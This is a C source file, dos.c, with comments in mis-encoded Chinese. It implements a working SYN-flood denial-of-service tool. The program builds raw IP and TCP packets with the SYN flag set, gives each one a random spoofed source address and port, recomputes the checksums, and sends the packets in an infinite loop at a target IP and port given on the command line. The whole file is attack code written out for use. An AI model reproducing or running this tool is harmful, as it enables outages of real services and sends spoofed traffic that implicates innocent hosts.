/* dos.c - һ��dos( denial of service:�ܾ�����)�������� */  
  
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>  
#include <netdb.h>  
#include <string.h>  
#include <sys/types.h>  
#include <sys/time.h>  
#include <netinet/in.h>  
#include <linux/ip.h>  
#include <linux/tcp.h>  
  
  
int sock_fd;  
  
/* tcp αͷ��, ����У���ʱ��Ҫ, ���Բο�rfc 793 */  
typedef struct psheader {    
    unsigned long saddr;    /* ԴIP��ַ                */  
    unsigned long daddr;    /* Ŀ��IP��ַ               */  
    char mbz;       /* mbz = must be zero, ���������� */  
    char protocal;      /* 8λЭ���                */    
    unsigned short tcpl;    /* TCP������               */  
} pheader;  
  
  
/* һ��ͨ�õļ���У��͵ĺ��� */  
  
static unsigned short ip_sum ( u_short *addr, int len )  
{  
    register int nleft = len;  
    register u_short * w = addr;  
    register int sum = 0;  
  
    u_short answer = 0;  
      
    while ( nleft > 1 ) {  
        sum += *w++;  
        nleft -= 2;  
    }  
  
    if ( nleft == 1 ) {  
        *(u_char *) (&answer) = *(u_char *) w;  
        sum += answer;  
    }  
  
    /* sum = ��16λ��ֵ���ϵ�16λ */  
    sum = (sum >> 16) + (sum & 0xffff);     
    /* ���Ͻ�λ           */  
    sum += (sum >> 16);                      
    /* ȡ��,ͬʱ���16λ��Ч      */  
    answer = ~sum;                    
    return (answer);  
}  
  
/* ���¼���ip��tcpͷ��У���,��������Ӧ��Э���ֶ� */  
void re_cal_checksum( struct iphdr * ih, struct tcphdr * th )  
{  
    pheader ph;  
    char buf[100];  
      
    /* αͷԴip��ַ   */  
    ph.saddr = ih->saddr;  
    /* αͷĿ��ip��ַ */  
    ph.daddr = ih->daddr;  
    ph.mbz = 0;  
    /* Э��             */  
    ph.protocal = IPPROTO_TCP;  
    /* tcp������     */  
    ph.tcpl = htons( sizeof( struct tcphdr ) );  
      
    memcpy( buf, &ph, sizeof( pheader ) );  
    memcpy( buf + sizeof(pheader), th, sizeof( struct tcphdr ) );  
    memset( buf + sizeof(pheader) + sizeof(struct tcphdr), 0, 4 );  
    th->check = ip_sum( (u_short*)buf, (sizeof(pheader)+sizeof(struct tcphdr)+1)&~1);  
      
    memcpy(buf, ih, 4*ih->ihl);  
    memcpy(buf+4*ih->ihl, th, sizeof(*th));  
    memset(buf+4*ih->ihl+sizeof(*th), 0, 4);  
      
    ih->check=ip_sum( (u_short*)buf, (4*ih->ihl + sizeof(*th) + 1) & ~1);  
    memcpy(buf, ih, 4*ih->ihl);  
}  
  
void init_tcp_ip_head( struct iphdr * ih, struct tcphdr * th, unsigned long dest_ip, unsigned short dest_port)  
{  
    /* IP�汾, ���ڻ�������ipv4            */  
    ih->version = 4;  
    /* ip�ײ�����, һ�㶼Ϊ20���ֽ�, ����ihl�Ǳ�ʾ���ٸ�4�ֽ�,���Ҫ����4,����5 */  
    ih->ihl = 5;  
    /* ��������                */  
    ih->tos = 0;  
    /* ip���ݰ����ܳ���               */  
    ih->tot_len = sizeof( struct iphdr ) + sizeof( struct tcphdr );  
    /* 16λ��ʶ                       */  
    ih->id = ( unsigned int )random();  
    /* ��Ƭƫ��                    */  
    ih->frag_off = 0;  
    /* 8λ����ʱ��                  */  
    ih->ttl = ( unsigned int )random()%150 + 20;  
    /* ָ���������õ�Э��,���ǵ�ȻҪ����TCP�� */  
    ih->protocol = IPPROTO_TCP;  
    /* У���, ���»����¼���, �ȳ�ʼ��Ϊ0 */  
    ih->check = 0;     
    /* Դip��ַ, ��ʼ����ʱ��,   */  
    ih->saddr = ( unsigned int )random();  
    /* ��Ҫ������Ŀ��IP��ַ         */  
    ih->daddr = dest_ip;  
    /* ok, ip ͷ��ʼ����� */  
      
    /* tcp Դ�˿ں�, ����һ��         */  
    th->source = ( unsigned int )random() % 30000 + 4096;  
    /* Ŀ�Ķ˿ں�,��Ҫ�����Է��Ķ˿�       */  
    th->dest = htons( dest_port );  
    /* 32λ���к�,����һ��        */  
    th->seq = ( unsigned int )random();  
    /* 32λȷ�����к�,���������ǹ�����,������ֵ�������� */  
    th->ack_seq = 0;  
    /* tcp �ײ�����,һ��Ϊ20,ͬ����Ҫ����4 */  
    th->doff = sizeof( struct tcphdr ) / 4;  
    /* ����ֵ, ����                */  
    th->res1 = 0;  
    /* ���Ͷ˻�û�������                  */  
    th->fin = 0;  
    /* ��������һ������,��λһ��Ҫ��1      */  
    th->syn = 1;  
    /* �ؽ�����,��Ȼû��Ҫ,���Ϊ0         */  
    th->rst = 0;  
    /* ���ܷ�Ӧ�����������Ľ���Ӧ�ò�    */  
    th->psh = 0;  
    /* ȷ�����,���������Ƿ�������,����ȷ��*/  
    th->ack = 0;  
    /* ����ָ��                */  
    th->urg = 0;  
    /* 16���ڴ�С,���ܶ��������ܵ��ֽ���   */  
    th->window = htons( 65535 );  
    /* ����ֻ�ǳ�ʼ,���»�У��        */  
    th->check = 0;  
    /* 16λ����ָ��                 */  
    th->urg_ptr = 0;  
    /* OK, tcp ͷ��ʼ�����   */  
}  
  
void send_connect( int sockfd, char * buf )  
{  
    struct iphdr * ih = ( struct iphdr * ) buf;  
    struct tcphdr * th = ( struct tcphdr * )( buf + sizeof(struct iphdr) );  
  
    /* �������Ļ����ĵ�ַ�ṹ */  
    struct sockaddr_in target;  
    target.sin_family = AF_INET;  
    target.sin_port = th->dest;  
    target.sin_addr.s_addr = ih->daddr;  
      
    /* ������������    */  
    int ret;  
    ret = sendto( sockfd, buf, sizeof(struct iphdr)+sizeof(struct tcphdr), 0,   
            (struct sockaddr*)&target, sizeof(target) );  
    if( ret == -1 ) {  
        perror("send packet");  
        exit(1);  
    }  
}  
  
int main( int argc, char **argv )  
{  
    int i;  
    unsigned short int dest_port;  
    unsigned long int dest_ip;  
     
    /* �����û�������������, ����û���ָ��ip��ַ�Ļ�, Ĭ���ǹ����Լ�, �����ָ���˿ںŵĻ�,Ĭ�Ͼ���22 */  
    if( argc == 1 ){  
        dest_ip = inet_addr( "127.0.0.1" );  
        dest_port = htons( 22 );  
    } else if( argc == 2 ) {  
        dest_ip = inet_addr( argv[1] );  
        dest_port = htons( 22 );  
    } else if( argc == 3 ) {  
        dest_ip = inet_addr( argv[1] );  
        dest_port=ntohs(atoi( argv[2]) );  
    } else {  
        printf("Usage: %s [��Ҫ������ip��ַ] [��Ҫ������port number] \n", argv[0] );  
        exit( 1 );  
    }  
      
    /* ����һ��ԭʼ���׽ӿ�, �Լ���װipͷ��tcpͷ */  
    sock_fd = socket( AF_INET, SOCK_RAW, IPPROTO_RAW );  
    if( sock_fd == -1 ) {  
        perror("socket");  
        exit(1);  
    }  
  
    /* buf - ���ڴ洢ip �� tcpͷ */  
    char * buf = malloc( sizeof(struct iphdr) + sizeof(struct tcphdr) );  
    /* ip ͷ�ṹ  */  
    struct iphdr * ih = ( struct iphdr * ) buf;  
    /* tcp ͷ�ṹ */  
    struct tcphdr * th = ( struct tcphdr * )( buf + sizeof(struct iphdr) );  
      
    /* ��ʼ��tcp��ipͷ�ṹ */  
    init_tcp_ip_head( ih, th, dest_ip, dest_port );  
      
    while ( 1 ) {  
        /* αװԴip��ַ */  
        ih->saddr = ( unsigned int )random();  
        /* αװԴ�˿ں� */  
        th->source = ( unsigned int )random() % 30000 + 4096;  
          
        /* ���¼��� ipͷ��tcpͷ��У��� */  
        re_cal_checksum( ih, th );  
          
        /* ������������, ��ʼ���� */    
        send_connect( sock_fd, buf );  
    }     
}  